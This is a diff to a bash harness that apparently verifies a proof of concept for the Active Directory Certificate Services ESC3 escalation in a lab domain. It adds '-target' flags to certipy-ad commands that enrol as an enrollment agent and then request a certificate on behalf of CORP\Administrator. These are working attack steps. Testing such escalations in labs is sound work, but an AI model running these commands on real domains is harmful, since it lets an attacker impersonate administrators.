@@ -19,11 +19,17 @@ fi
 cd "$(mktemp -d)" || { echo "[verify-poc-09] HARNESS ERROR: mktemp failed" >&2; exit 2; }
 
 # Step 1: alice enrols in ESC3-Agent (the EKU=Certificate Request Agent template).
+#
+# -target is REQUIRED on BOTH enrollment steps: without it certipy sends the RPC
+# request to -dc-ip, the DOMAIN CONTROLLER, which does not run CertSvc, and the
+# run dies with ept_s_not_registered for ICertRequestD. -dc-ip is for
+# LDAP/Kerberos only.
 AGENT=$(timeout 60 /usr/bin/certipy-ad req \
     -u 'alice@corp.local' -p 'Password1!' \
     -ca 'corp-ca01-CA' \
+    -target corp-ca01.corp.local \
     -dc-ip 10.20.30.5 \
-    -template 'ESC3-Agent' 2>&1 || true)
+    -template 'ESC3-Agent' 2>&1 </dev/null || true)
 echo "--- agent enrol ---"; echo "$AGENT"
 
 # --- CA not serving RPC: HARNESS ERROR, never a verdict ---
@@ -66,6 +72,7 @@ fi
 ONBEHALF=$(timeout 60 /usr/bin/certipy-ad req \
     -u 'alice@corp.local' -p 'Password1!' \
     -ca 'corp-ca01-CA' \
+    -target corp-ca01.corp.local \
     -dc-ip 10.20.30.5 \
     -template 'ESC3-User' \
     -on-behalf-of 'CORP\Administrator' \
